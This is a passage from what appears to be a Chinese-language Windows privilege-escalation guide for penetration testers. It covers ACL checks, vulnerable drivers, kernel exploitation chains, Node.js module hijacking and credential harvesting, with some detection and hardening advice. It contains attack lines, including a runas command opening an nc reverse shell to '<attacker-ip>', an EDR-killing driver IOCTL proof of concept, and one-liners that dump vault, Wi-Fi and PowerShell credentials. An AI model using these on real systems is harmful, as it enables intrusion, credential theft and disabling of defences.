对于 Azure DevOps Server 或 Azure Pipelines 项目，请区分**创建或编辑** pipeline 的权限与**将其排入队列**并使用所选 agent pool 的权限；[Microsoft 分别记录了 pipeline 权限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)和 [pool 授权](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)。如果低权限账户能够提交脚本步骤，并在自托管 Windows agent 上运行该 pipeline，该步骤就会以 [agent 配置的操作系统账户](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)身份执行。在声称存在跨用户或 SYSTEM 权限转换之前，请核实确切的 pipeline、分支/资源限制、已授权的 pool、可运行的 job，以及 agent 服务身份。仅安装了 agent、拥有项目角色或具有仓库写权限都只是线索；被动枚举期间应检查权限和本地服务元数据，不要启动 build。

#### Microsoft Entra Connect Sync 凭据

[Microsoft 区分](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync 服务账户**（运行同步服务并访问其 SQL 数据库）与 **AD DS connector 账户**（其目录权限取决于配置的同步功能）。Connector 凭据会加密存储在该数据库中，密钥材料则由 [ADSync 服务账户下的 DPAPI 保护](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。仅有已安装的同步服务、名称听起来像本地管理员的组，或能够访问数据库，都不能证明可以解密凭据或提升域权限。请分别检查实际的数据库读取权限、服务账户/密钥访问权限、安装及 SQL 布局、已配置的 connector 身份，以及该身份实际生效的 AD 权限。常规枚举只应显示服务和访问权限元数据，不要查询或打印已存储的机密。

#### 打印机驱动程序支持 DLL 权限

已安装的打印机驱动程序可能会将支持 DLL 放在 `C:\ProgramData` 下，并在权限更高的打印进程中加载这些 DLL。请检查确切的驱动程序目录和 DLL ACL，包括父目录和重解析点，即使无法通过打印机 WMI 枚举也是如此。对于 [Ricoh 打印机驱动程序漏洞 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1)，报告中的路径为 `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`；[原始披露](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)描述了 `PrintIsolationHost.exe` 加载 DLL 的情况。ACL 可写只是线索：请在考虑拒绝条目后确认实际写入权限，确认相关驱动程序已安装且会以特权身份加载该文件，并核实供应商是否已通过更新的驱动程序或安全程序修复该安装。不要仅凭目录名称或驱动程序版本推断存在漏洞。

### 写入权限

检查你是否可以修改某个配置文件来读取特殊文件，或者修改由 Administrator 账户执行的二进制文件（schedtasks）。

查找系统中权限设置薄弱的文件夹/文件的一种方法是：

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ 插件自动加载持久化/执行

Notepad++ 会自动加载其 `plugins` 子文件夹中的所有插件 DLL。如果存在可写的便携版/副本安装，放入恶意插件即可在每次启动时于 `notepad++.exe` 内自动执行代码（包括通过 `DllMain` 和插件回调执行）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 启动时运行

**检查是否可以覆盖某个将由其他用户执行的注册表项或二进制文件。**\
**阅读** **以下页面**，了解更多可用于提升权限的有趣 **autoruns 位置**：


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 驱动程序

查找可能存在的**第三方异常/易受攻击**驱动程序

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

如果驱动暴露了任意内核读写原语（常见于设计不佳的 IOCTL handler），你可以直接从内核内存中窃取 SYSTEM token 来提权。<sup>[[13]](#references)</sup> 分步操作方法见：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

相关的 Windows kernel-exploitation 资料：

关于具有用户可写读写寄存器的 kernel-mode ring-buffer 案例，参见 [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming)。

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

对于易受竞态条件影响、且易受攻击的调用会打开攻击者控制的 Object Manager 路径的 bug，可以通过刻意放慢查找速度（使用最大长度的组件或深层目录链）将窗口从几微秒延长到几十微秒：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool 泄露和 I/O ring pivot

某些 Windows kernel LPE 攻击链可以由两个单独看来都较弱的 bug 构成：一个 **cancel-safe queue 生命周期竞态**，在队列锁仍被持有时释放 request/CBD；以及一个 **释放锁后再复制** 的信息泄露问题，它会在 `RtlCopyToUser` 期间泄露已释放的 paged-pool 分配。<sup>[[29]](#references)</sup>

审计与利用说明：

- **持锁释放 + 随后取消**：寻找这样的成功路径：执行 **Acquire -> CompleteRequest/free -> Release**；而取消路径执行 **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**。如果成功路径在释放 CBDQ/CSQ 锁之前就到达 `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`，那么在 `NtCancelIoFileEx -> IopCsqCancelRoutine` 中阻塞的线程之后可能会恢复执行，并将已释放的 `PFLT_CALLBACK_DATA` 传回驱动的 remove callback。
- **用同尺寸、由攻击者控制的 paged-pool 分配回收已释放的队列对象**。`NPFS` Data Queue Entries 很有用，因为其 payload 和大小都可控，而且之后可以通过 pipe read/peek 操作探测它们。如果已释放对象中嵌入了 list links，就用 **由用户内存中的伪造 request node 构成的循环链表** 覆盖它们，让驱动反复处理攻击者定义的 request structure，而不是在原始链表头处终止。
- **升级可预测写入**：如果伪造 request 将 bookkeeping 写入（timestamps / QPC / refcount-adjacent fields）所用的嵌套 context pointer 重定向，你可能获得一个 **地址可控但值不可控** 的内核写入。在这种情况下，目标应是被喷洒 pool 对象的 **length/size** 字段，而不是最终的 code/data pointer；然后遍历喷洒对象，直到损坏的对象带来 **越界 paged-pool 读取**。
- **可竞态的信息泄露模式**：任何执行 `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` 的 syscall 都是很好的候选目标。如果攻击者能够增大被复制的 buffer（例如，添加许多 list/resource entry，从而增大 serializer 最终分配的大小），可靠性会更高，因为更长的复制过程会扩大替换窗口，且不一定导致机器崩溃。
- **适合填充的指针密集型目标**：Windows **I/O ring** 注册 buffer 数组是很好的信息泄露目标，因为其 paged-pool 大小由攻击者控制（`8 * regBufferCnt`），且每个元素都是指向 `_IOP_MC_BUFFER_ENTRY` 的内核指针。泄露其中一个数组，找回周围的 `IORING_OBJECT`，然后破坏 **`RegBuffers`** 和 **`RegBuffersCount`**，使后续 I/O ring 操作使用攻击者伪造的 entry 并提供任意内核读写。如果唯一可用的写入只能给出一个稳定字节（例如来自 `KUSER_SHARED_DATA+0x14`），则使用 **重叠的非对齐写入** 构造重复字节的用户指针，例如 `0x0101010101010101`，用 `VirtualAlloc` 映射它，并将伪造的注册 buffer 数组放在那里。<sup>[[30]](#references)</sup>

有用的调试指标：

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

一旦通过损坏的 I/O ring 获得任意内核读写能力，就使用标准的 post-primitive 工作流窃取 SYSTEM token：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive 内存损坏 primitives

现代 hive 漏洞可让你布置确定性内存布局、滥用可写的 HKLM/HKU 后代项，并将元数据损坏转化为内核分页池溢出，而无需自定义驱动程序。在这里了解完整利用链：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` 对攻击者控制路径的 direct-mode 类型混淆

某些驱动程序接受来自用户态的注册表路径，只验证它是格式正常的 UTF-16 字符串，随后调用 `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)`，并通过 `RTL_QUERY_REGISTRY_DIRECT` 将结果写入栈上的标量（例如 `int readValue`）。如果缺少 `RTL_QUERY_REGISTRY_TYPECHECK`，`EntryContext` 将根据注册表值的**实际**类型进行解释，而非开发者预期的类型。

这会产生两种有用的 primitives：<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**：用户可控的绝对路径 `\Registry\...` 允许驱动程序查询攻击者选择的键，通过返回码/日志泄露键是否存在，有时还能读取调用者无法直接访问的值。
- **内核内存损坏**：标量目标（例如 `&readValue`）会发生类型混淆，具体取决于注册表值类型，可能被当作 `REG_QWORD`、`UNICODE_STRING` 或有大小限制的二进制缓冲区。

实际利用注意事项：

- **Windows 8+ 缓解措施**：如果查询通过 `RTL_QUERY_REGISTRY_DIRECT` 命中**不受信任的 hive**，但未使用 `RTL_QUERY_REGISTRY_TYPECHECK`，内核调用者会崩溃，并触发 `KERNEL_SECURITY_CHECK_FAILURE (0x139)`。为保持可利用性，应寻找受信任系统 hive 内**攻击者可写的键**，而不是在 `HKCU` 下暂存值。
- **受信任 hive 暂存**：使用 NtObjectManager 枚举 `\Registry\Machine` 下可写的后代项，然后使用复制出的**低完整性** token 重新运行扫描，以查找沙箱上下文可访问的键：<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**：将 8 字节数据直接写入 4 字节 `int`，会破坏相邻的栈数据，并可能部分覆盖附近的回调/函数指针。
- **`REG_SZ` / `REG_EXPAND_SZ`**：direct mode 期望 `EntryContext` 指向 `UNICODE_STRING`。如果代码先将攻击者控制的 `REG_DWORD` 加载到栈标量中，然后在读取字符串时复用同一缓冲区，攻击者就能控制 `Length`/`MaximumLength`，并部分影响 `Buffer` 指针，从而实现半受控的内核写入。
- **`REG_BINARY`**：对于较大的二进制数据，direct mode 会将 `EntryContext` 处的第一个 `LONG` 视为有符号缓冲区大小。如果先前的 `REG_DWORD` 读取在复用的标量中留下了攻击者控制的**负值**，那么后续 `REG_BINARY` 查询就会将攻击者的字节直接复制到相邻的栈槽中，这通常是完整覆盖回调指针最直接的方式。

强力排查模式：**异构注册表读取复用同一个栈变量，且没有重新初始化**。搜索 `RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、复用的 `EntryContext` 指针，以及首次注册表读取会控制是否进行第二次读取的代码路径。

#### 滥用设备对象缺少 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

某些由可信签名的第三方驱动通过 IoCreateDeviceSecure 使用了严格的 SDDL 创建设备对象，却忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有此标志时，通过包含额外组件的路径打开设备，安全 DACL 不会生效，因此任何非特权用户都可以通过使用类似以下命名空间路径来获取句柄：<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（来自真实案例）

用户一旦能打开设备，就可以滥用驱动提供的特权 IOCTL，实现 LPE 和篡改。现实中观察到的能力示例：
- 返回对任意进程的完全访问权限句柄（通过 DuplicateTokenEx/CreateProcessAsUser 窃取 token / 启动 SYSTEM shell）。
- 不受限制地读取/写入原始磁盘（离线篡改、启动时持久化技巧）。
- 终止任意进程，包括 Protected Process/Light（PP/PPL），从而通过内核在用户态终止 AV/EDR。

最简 PoC 模式（用户态）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

开发者的缓解措施
- 创建受 DACL 限制的设备对象时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 对特权操作验证调用方上下文。允许终止进程或返回句柄前，添加 PP/PPL 检查。
- 限制 IOCTL（访问掩码、METHOD_*、输入验证），并考虑采用 brokered 模型，而不是直接授予内核权限。

防御者的检测思路
- 监控用户模式对可疑设备名称（例如 \\ .\\amsdk*）的打开操作，以及可能表明滥用行为的特定 IOCTL 序列。
- 强制执行 Microsoft 的易受攻击驱动程序阻止列表（HVCI/WDAC/Smart App Control），并维护自己的允许/拒绝列表。


## PATH DLL Hijacking

如果你对 **PATH 中的某个文件夹具有写入权限**，就可能劫持进程加载的 DLL 并 **提升权限**。<sup>[[2]](#references)</sup>

检查 PATH 中所有文件夹的权限：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

有关如何滥用此检查的更多信息：


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 通过 `C:\node_modules` 劫持 Node.js / Electron 模块解析

这是 **Windows 不受控搜索路径**的一种变体，会影响执行裸导入（例如 `require("foo")`）且预期模块**缺失**的 **Node.js** 和 **Electron** 应用。<sup>[[20]](#references)</sup>

Node 会沿目录树向上遍历，并检查每个父目录中的 `node_modules` 文件夹。在 Windows 上，这一遍历可能到达驱动器根目录，因此从 `C:\Users\Administrator\project\app.js` 启动的应用可能会依次查找：<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

如果**低权限用户**可以创建 `C:\node_modules`，就能植入恶意的 `foo.js`（或包目录），然后等待**更高权限的 Node/Electron 进程**解析这个缺失的依赖。payload 会在受害进程的安全上下文中执行，因此，只要目标以管理员身份运行、由提升权限的计划任务/服务包装器运行，或由自动启动的高权限桌面应用运行，就会造成 **LPE**。

以下情况尤其常见：

- 依赖在 `optionalDependencies` 中声明<sup>[[22]](#references)</sup>
- 第三方库将 `require("foo")` 包在 `try/catch` 中，并在失败后继续运行
- 某个包已从生产构建中移除、打包时遗漏，或安装失败
- 存在漏洞的 `require()` 深藏在依赖树中，而非主应用代码中

### 搜寻易受攻击的目标

使用 **Procmon** 验证解析路径：<sup>[[23]](#references)</sup>

- 将 `Process Name` 过滤为目标可执行文件（`node.exe`、Electron 应用 EXE 或包装器进程）
- 将 `Path` 过滤为 `contains` `node_modules`
- 重点关注 `NAME NOT FOUND`，以及最终在 `C:\node_modules` 下成功打开的记录

在解包后的 `.asar` 文件或应用源代码中，值得留意的代码审查模式：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### 利用

1. 从 Procmon 或源码审查中识别**缺失的 package 名称**。
2. 如果 root lookup 目录尚不存在，则创建该目录：

```powershell
mkdir C:\node_modules
```

3. 放入一个名称与预期完全一致的模块：

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. 触发受害应用。如果应用尝试 `require("foo")`，而合法模块不存在，Node 可能会加载 `C:\node_modules\foo.js`。

符合此模式的真实缺失可选模块示例包括 `bluebird` 和 `utf-8-validate`，但可复用的是**技术**：找出任何特权 Windows Node/Electron 进程会解析的**缺失裸导入**。

### 检测与加固建议

- 当用户创建 `C:\node_modules` 或在其中写入新的 `.js` 文件/软件包时发出警报。
- 搜索从 `C:\node_modules\*` 读取文件的高完整性进程。
- 在生产环境中打包所有运行时依赖，并审计 `optionalDependencies` 的使用情况。
- 检查第三方代码中静默使用 `try { require("...") } catch {}` 的模式。
- 如果库支持，禁用可选探测（例如，某些 `ws` 部署可以通过 `WS_NO_UTF_8_VALIDATE=1` 避免旧版 `utf-8-validate` 探测）。

## 网络

### 共享目录

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

检查 hosts 文件中是否硬编码了其他已知计算机。

```
type C:\Windows\System32\drivers\etc\hosts
```

### 网络接口与 DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 开放端口

从外部检查**受限服务**

```bash
netstat -ano #Opened ports?
```

对于本地监听器，将其 PID 与进程所有者、可执行文件路径，以及启动它的服务或计划任务关联起来。只有在其身份验证和命令控制允许的情况下，远程控制服务才能以其桌面用户身份提供访问。以更高权限账户运行的自定义 TCP 应用是另一个审查目标：监听器和二进制文件路径只是被动线索，而经过身份验证的内存破坏利用路径则需要分析该确切二进制文件及其可访问的输入。如果某个暴露端口似乎属于系统进程，请先将其与 [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) 的结果进行比较，再判断后端服务；仅有转发规则并不能证明目标可访问或存在漏洞。

### 路由表

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP 表

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### 防火墙规则

[**查看此页面中的防火墙相关命令**](../basic-cmd-for-pentesters.md#firewall) **（列出规则、创建规则、关闭、关闭……）**

[此处还有更多网络枚举命令](../basic-cmd-for-pentesters.md#network)

### 适用于 Linux 的 Windows 子系统 (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到

如果你获得 root 用户权限，就可以监听任意端口（首次使用 `nc.exe` 监听端口时，会弹出 GUI 询问是否允许防火墙放行 `nc`）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

要以 root 身份轻松启动 bash，可以尝试 `--default-user root`

你可以在 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 文件夹中浏览 `WSL` 文件系统。

在 WSL 中拥有 Linux `root` 权限本身并不会授予 Windows 管理员权限。如果当前 Windows 身份可以读取某个发行版的文件系统，请检查 shell 历史文件（包括 `/root/.bash_history`），查看其中是否记录了凭据；但要提升权限，仍需有效的高权限账户和允许的身份验证途径。`LocalState\rootfs` 目录结构适用于较旧的 WSL 安装；WSL 2 通常会将发行版存储在 [`ext4.vhdx` 虚拟磁盘](https://learn.microsoft.com/en-us/windows/wsl/disk-space)中，因此应先确认实际使用的发行版和存储路径。自动枚举时避免输出历史记录内容。

## Windows 凭据

### Winlogon 凭据

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

将 `DefaultUserName` 和 `DefaultDomainName` 视为账户上下文，而不是凭据。非空的 `DefaultPassword` 或 `AltDefaultPassword` 值属于明文注册表发现项。如果 `AutoAdminLogon=1`，但无法读取明文密码，这只能作为线索：[Sysinternals Autologon 可以将密码存储为 LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)，而普通的注册表读取无法确认该 secret 是否存在或能否被检索。在报告凭据泄露之前，应检查访问权限和实际登录配置。

### 凭据管理器 / Windows Vault

摘自 [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault 会存储服务器、网站和其他程序的用户凭据，供 **Windows** 用来 **自动登录用户**。乍一听，这可能让人以为用户可以存储 Facebook、Twitter 或 Gmail 等网站的凭据，并让浏览器自动登录，但实际并非如此。

Windows Vault 存储的是 Windows 可用于自动登录用户的凭据，这意味着任何**需要凭据才能访问资源**（服务器或网站）的 **Windows 应用程序**，都可以使用 Credential Manager 和 Windows Vault，并使用其中提供的凭据，而不必每次都让用户输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们无法使用特定资源的凭据。因此，如果你的应用程序想要使用 vault，就应该以某种方式**与凭据管理器通信，并从默认存储 vault 中请求该资源的凭据**。

使用 `cmdkey` 列出计算机上存储的凭据。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

然后，你可以使用 `runas` 和 `/savecred` 选项来使用已保存的凭据。以下示例通过 SMB 共享调用远程二进制文件。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

使用提供的一组凭据运行 `runas`。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

请注意，也可以使用 mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### UWP PasswordVault / Credential Locker

现代 Windows UWP 应用、Microsoft Edge 和现代系统服务会将身份验证令牌和明文密码存储在 Universal Windows Platform (UWP) `PasswordVault` 中（在 `vaultcmd` 中也称为 `Web Credentials`）。此存储空间按会话隔离，无需管理员权限或 `SeDebugPrivilege` 即可原生解密。

在用户的活动会话中执行以下 PowerShell 命令，即可立即转储并解密所有已存储的用户名和明文密码：

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**数据保护 API（DPAPI）**提供了一种对数据进行对称加密的方法，主要用于 Windows 操作系统中对非对称私钥进行对称加密。此加密会利用用户或系统机密，大幅增加熵。

**DPAPI 使用从用户登录机密派生的对称密钥来加密密钥**。在系统加密场景中，它会使用系统的域身份验证机密。

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 代表用户的[安全标识符](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与用于保护用户私钥的主密钥位于同一文件中**，通常由 64 字节随机数据组成。（请注意，对此目录的访问受到限制，因此无法通过 CMD 中的 `dir` 命令列出其内容，但可以通过 PowerShell 列出。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

可以使用 **mimikatz module** `dpapi::masterkey`，并传入适当的参数（`/pvk` 或 `/rpc`）来解密它。

**master password** 保护的 **credentials files** 通常位于：

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
如果你是 root，可以使用 `sekurlsa::dpapi` module 从 **memory** 中 **extract many DPAPI** **masterkeys**。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** 常用于 **scripting** 和自动化任务，可方便地存储加密凭据。这些凭据使用 **DPAPI** 保护，这通常意味着它们只能由创建它们的同一台计算机上的同一用户解密。

导出的凭据可以使用任意文件名，也可以是 `.xml` 路径。如果脚本或文件清单指向此类文件，应解析该账户的实际配置文件目录，而不要假定路径位于 `C:\Users`：[Windows 配置文件可能位于其他位置](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。文件可读只能作为线索；[Windows `Export-Clixml` 会将加密凭据绑定到导出它的用户和计算机](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)，而且恢复出的账户还必须单独拥有目标服务的有效权限。首先检查路径和 ACL，日常枚举时不要输出加密值或明文值。

要从包含 PS credentials 的文件中 **decrypt**，可以执行：

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 已保存的 RDP 连接

可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
以及 `HKCU\Software\Microsoft\Terminal Server Client\Servers\` 中找到。

### 最近运行的命令

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **远程桌面凭据管理器**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

使用 **Mimikatz** 的 `dpapi::rdg` 模块和适当的 `/masterkey` 来**解密任意 .rdg 文件**\
使用 Mimikatz 的 `sekurlsa::dpapi` 模块可以从内存中**提取许多 DPAPI masterkey**

**mRemoteNG 使用不同的连接存储方式。**检查 `%APPDATA%\mRemoteNG` 和用户 Documents 目录下可读的 XML 文件，包括 `config.xml` 之类的普通文件名。在将 XML 文件视为凭据线索之前，先识别连接 schema 和加密的 `Password` 属性。存储的值不是 DPAPI/RDCMan 密码；能否恢复取决于文件的加密设置，以及是否使用了自定义 master password。进行广泛枚举时，避免打印加密值。

**Remote Desktop Plus 配置文件导出文件**也可能以可读形式存在于用户目录或共享的管理文件夹中。旧版 `profiles.xml` 导出文件中，`Data/Profile` 条目包含 `ProfileName`、`Password` 和 `Secure` 元素。将非空的密码元素视为凭据线索，但不要打印它，也不要假设它是明文：[厂商说明](https://www.donkz.nl/)，配置文件保护可能绑定到创建该文件的账户和计算机，也可能配置得不那么严格。在依赖该文件之前，先确认文件来源和恢复条件。

### Sticky Notes

人们经常在 Windows 工作站上使用 StickyNotes 应用来**保存密码**和其他信息，却没意识到它是一个数据库文件。此文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，始终值得查找和检查。

人们有时会在便笺应用中保存密码和其他信息。Microsoft 打包版 Sticky Notes 应用通常将便笺存储在 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`；较旧或不同的应用可能使用其他用户配置文件存储位置，包括 LevelDB。在将 SQLite 文件缺失视为没有便笺之前，先确认已安装的应用和存储格式。

